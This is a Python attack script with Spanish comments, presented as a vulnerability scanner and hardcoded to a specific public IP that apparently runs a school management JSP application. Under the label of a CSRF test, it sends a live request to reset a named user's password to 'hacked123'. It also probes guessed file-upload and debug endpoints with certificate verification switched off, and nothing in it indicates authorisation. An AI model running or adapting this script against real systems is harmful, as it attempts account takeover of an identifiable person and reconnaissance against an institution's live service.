import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class VulnerabilityScanner:
    def __init__(self, target_ip):
        self.target_ip = target_ip
        self.base_url = f"https://{target_ip}"
        self.session = requests.Session()
        self.session.verify = False

    def test_common_vulnerabilities(self):
        """Prueba vulnerabilidades comunes en aplicaciones educativas"""
        print("[*] Probando vulnerabilidades comunes...")
        
        # CSRF testing
        print("\n[*] Probando vulnerabilidad CSRF...")
        csrf_test_data = {
            'yAccion': 'cambiar_password',
            'yUsuario': 'hnieto',
            'xPasswordActual': 'test',
            'xPasswordNuevo': 'hacked123',
            'xConfirmarPassword': 'hacked123'
        }
        
        try:
            response = self.session.post(self.base_url, data=csrf_test_data, timeout=5)
            if "contraseña" in response.text.lower():
                print("[!] Posible vulnerabilidad CSRF en cambio de contraseña")
        except:
            pass

    def test_file_upload_vulnerability(self):
        """Prueba vulnerabilidad de subida de archivos"""
        print("\n[*] Probando subida de archivos...")
        
        # Buscar endpoints de upload
        upload_endpoints = [
            "/jsp/escolar/subir_archivo.jsp",
            "/jsp/admin/upload.jsp",
            "/jsp/upload/archivo.jsp",
            "/jsp/escolar/proceso_admision/subir_documento.jsp"
        ]
        
        for endpoint in upload_endpoints:
            try:
                url = f"{self.base_url}{endpoint}"
                response = self.session.get(url, timeout=5)
                if response.status_code == 200:
                    print(f"[!] Endpoint de upload encontrado: {endpoint}")
            except:
                pass

    def check_for_debug_information(self):
        """Busca información de depuración expuesta"""
        print("\n[*] Buscando información de depuración...")
        
        debug_endpoints = [
            "/jsp/debug/info.jsp",
            "/jsp/test/status.jsp",
            "/jsp/SystemInfo.jsp",
            "/jsp/version.jsp"
        ]
        
        for endpoint in debug_endpoints:
            try:
                url = f"{self.base_url}{endpoint}"
                response = self.session.get(url, timeout=5)
                if response.status_code == 200:
                    if "version" in response.text.lower() or "debug" in response.text.lower():
                        print(f"[!] Información de depuración en: {endpoint}")
            except:
                pass

# Ejecutar escáner de vulnerabilidades
print("=== ESCANEO DE VULNERABILIDADES ===")
vuln_scanner = VulnerabilityScanner("189.254.143.102")
vuln_scanner.test_common_vulnerabilities()
vuln_scanner.test_file_upload_vulnerability()
vuln_scanner.check_for_debug_information()